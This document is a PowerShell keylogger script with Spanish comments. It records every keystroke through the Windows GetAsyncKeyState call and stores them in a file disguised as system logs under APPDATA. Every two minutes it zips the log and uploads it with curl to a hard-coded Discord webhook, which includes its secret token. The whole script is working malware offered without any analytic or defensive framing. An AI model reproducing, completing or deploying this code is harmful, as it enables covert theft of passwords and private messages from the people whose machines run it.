
# LOGGER.PS1 - Logger optimizado sin timestamp en el log
$logFile = "$env:APPDATA\SystemLogs\log.txt"
$logZip = "$env:TEMP\logger.zip"
$logDir = "$env:APPDATA\SystemLogs"
$lastSendFile = "$env:APPDATA\SystemLogs\lastsend.txt"
$webhookUrl = "https://discord.com/api/webhooks/1403475722776871033/762S8PxXk-xvAR5_0v95C5Of-pfWYKpJnYO3i1e5w9CEFiz-HUQByB_8ycBZKs4DzaXt"
$intervalMins = 2

if (-not (Test-Path $logDir)) { New-Item -ItemType Directory -Path $logDir -Force | Out-Null }

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(int i);
}
"@

function Send-LogAsZip {
    param ([string]$filePath)
    if (-not (Test-Path $filePath)) { return $false }
    try {
        Compress-Archive -Path $filePath -DestinationPath $logZip -Force
        $cmd = "curl.exe -F `"file1=@$logZip`" -F `"content=Registro de sistema`" `"$webhookUrl`""
        Invoke-Expression $cmd | Out-Null
        Remove-Item $logZip -Force -ErrorAction SilentlyContinue
        return $true
    } catch {
        Add-Content -Path $filePath -Value "[$(Get-Date)] ERROR al enviar ZIP: $_"
        return $false
    }
}

$lineBuffer = ""

while ($true) {
    for ($i = 1; $i -le 255; $i++) {
        $keyState = [Keyboard]::GetAsyncKeyState($i)
        if ($keyState -eq -32767) {
            $char = [char]$i
            if ([char]::IsControl($char)) {
                $char = "[CTRL+$i]"
                $lineBuffer += $char
            } elseif ($i -eq 13) {
                Add-Content -Path $logFile -Value $lineBuffer
                $lineBuffer = ""
            } else {
                $lineBuffer += $char
            }
        }
    }

    $now = Get-Date
    $lastSend = if (Test-Path $lastSendFile) { Get-Content $lastSendFile | Get-Date } else { $now.AddHours(-3) }

    if (($now - $lastSend).TotalMinutes -ge $intervalMins) {
        if ($lineBuffer) {
            Add-Content -Path $logFile -Value $lineBuffer
            $lineBuffer = ""
        }
        if (Send-LogAsZip -filePath $logFile) {
            Clear-Content -Path $logFile -ErrorAction SilentlyContinue
            $now.ToString("o") | Out-File -FilePath $lastSendFile -Force
        }
    }

    Start-Sleep -Milliseconds 250
}
